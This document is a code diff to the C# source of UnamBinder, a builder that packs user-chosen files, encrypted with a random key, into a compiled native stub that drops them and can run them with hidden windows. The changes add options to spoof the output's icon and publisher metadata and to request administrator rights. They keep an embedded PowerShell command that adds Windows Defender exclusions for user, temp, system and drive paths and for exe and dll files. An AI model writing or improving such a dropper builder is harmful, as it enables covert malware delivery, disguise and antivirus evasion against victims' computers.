@@ -11,6 +11,7 @@ namespace UnamBinder
     public partial class Builder : Form
     {
         private static Random random = new Random();
+        public Vanity vanity = new Vanity();
         private string key = RandomString(32);
 
         public Builder()
@@ -20,18 +21,65 @@ namespace UnamBinder
 
         public void NativeCompiler(string savePath)
         {
+            key = RandomString(32);
+
             string currentDirectory = Path.GetDirectoryName(savePath);
             string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";
 
-            if (Directory.Exists(Path.Combine(currentDirectory, "tinycc"))) {
-                Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
-            }
-            using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+            string compilerDirectory = Path.Combine(currentDirectory, "Compiler");
+            if (!Directory.Exists(compilerDirectory))
             {
-                archive.ExtractToDirectory(currentDirectory);
+                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+                {
+                    archive.ExtractToDirectory(compilerDirectory);
+                }
+                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
+                {
+                    archive.ExtractToDirectory(compilerDirectory);
+                }
             }
 
             StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
+
+            bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);
+
+            if (buildResource)
+            {
+                StringBuilder resource = new StringBuilder(Properties.Resources.resource);
+                string defs = "";
+                if (vanity.checkIcon.Checked)
+                {
+                    resource.Replace("#ICON", vanity.txtIconPath.Text);
+                    defs += " -DDefIcon";
+                }
+                if (checkAdmin.Checked)
+                {
+                    System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "administrator.manifest"), Properties.Resources.administrator);
+                    defs += " -DDefAdmin";
+                }
+                if (vanity.checkAssembly.Checked)
+                {
+                    resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
+                    resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
+                    resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
+                    resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
+                    resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
+                    resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
+                    resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
+                    defs += " -DDefAssembly";
+                }
+                System.IO.File.WriteAllText(Path.Combine(currentDirectory, "resource.rc"), resource.ToString());
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = Path.Combine(compilerDirectory, "MinGW64\\bin\\windres.exe"),
+                    Arguments = "--input resource.rc --output resource.o -O coff -F pe-i386 " + defs,
+                    WorkingDirectory = currentDirectory,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                }).WaitForExit();
+                System.IO.File.Delete(Path.Combine(currentDirectory, "resource.rc"));
+                System.IO.File.Delete(Path.Combine(currentDirectory, "administrator.manifest"));
+            }
 
             List<string> stringarray = new List<string>();
             List<string> intarray = new List<string>();
@@ -40,48 +88,42 @@ namespace UnamBinder
             for (int i = 0; i < count; i++)
             {
                 File filevar = (File)listFiles.Items[i];
-                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "cd" : filevar.comboDropLocation.Text;
-                byte[] filebytes = { };
                 try
                 {
-                    filebytes = System.IO.File.ReadAllBytes(filevar.txtBindfile.Text);
+                    byte[] filebytes = System.IO.File.ReadAllBytes(filevar.txtBindfile.Text);
+                    string filestring = Convert.ToBase64String(filebytes);
+                    stringarray.Add("{\"" + filevar.comboDropLocation.Text + "\",\"" + ToLiteral(Cipher(filevar.txtFilename.Text, key)) + "\",\"" + ToLiteral(Cipher(filestring, key)) + "\"}");
+                    intarray.Add("{" + filevar.txtFilename.Text.Length + "," + (filevar.toggleExecute.Checked ? "1" : "0") + "," + filestring.Length + "," + filebytes.Length + "," + (filevar.toggleHideWindow.Checked ? "1" : "0") + "}");
                 }
                 catch
                 {
                     MessageBox.Show("Could not read the file: " + filevar.txtBindfile.Text + ", make sure that the file exists and that the path is correct.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return;
                 }
-                string filestring = Convert.ToBase64String(filebytes);
-                stringarray.Add("{\"" + droplocation + "\",\"" + ToLiteral(Cipher(filevar.txtFilename.Text, key)) + "\",\"" + ToLiteral(Cipher(filestring, key)) + "\"}");
-                intarray.Add("{" + filevar.txtFilename.Text.Length + "," + (filevar.toggleExecute.Checked ? "1" : "0") + "," + filestring.Length + "," + filebytes.Length + "," + (filevar.toggleHideWindow.Checked ? "1" : "0") + "}");
             }
 
-            if (checkAdmin.Checked)
-            {
-                sb.Replace("DefWD", "TRUE");
-                CipherReplace(sb, "#WDCOMMAND", "cmd /c powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & exit");
-                System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
-            }
             sb.Replace("#ARRAYCOUNT", count.ToString());
             sb.Replace("#STRINGARRAY", string.Join(",", stringarray));
             sb.Replace("#INTARRAY", string.Join(",", intarray));
             sb.Replace("#KEY", key);
 
+            if (checkWD.Checked)
+            {
+                sb.Replace("DefWD", "TRUE");
+                CipherReplace(sb, "#WDCOMMAND", "cmd /c powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & exit");
+            }
+
             System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
             Process.Start(new ProcessStartInfo
             {
-                FileName = Path.Combine(currentDirectory, "tinycc\\tcc.exe"),
-                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32 -m32",
+                FileName = Path.Combine(compilerDirectory, "tinycc\\tcc.exe"),
+                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (buildResource ? "resource.o" : "") + " -luser32 -m32",
                 WorkingDirectory = currentDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
-            System.IO.File.Delete(Path.Combine(currentDirectory, "manifest.o"));
+            System.IO.File.Delete(Path.Combine(currentDirectory, "resource.o"));
             System.IO.File.Delete(Path.Combine(currentDirectory, filename));
-            if (Directory.Exists(Path.Combine(currentDirectory, "tinycc")))
-            {
-                Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
-            }
         }
 
         public void CipherReplace(StringBuilder source, string id, string value)
@@ -92,8 +134,8 @@ namespace UnamBinder
 
         public static string RandomString(int length)
         {
-            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789";
-            const int clength = 35;
+            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
+            const int clength = 55;
             var buffer = new char[length];
             for (var i = 0; i < length; ++i)
             {
@@ -190,6 +232,11 @@ namespace UnamBinder
             {
                 NativeCompiler(save);
             }
+        }
+
+        private void btnVanity_Click(object sender, EventArgs e)
+        {
+            vanity.Show();
         }
     }
 }
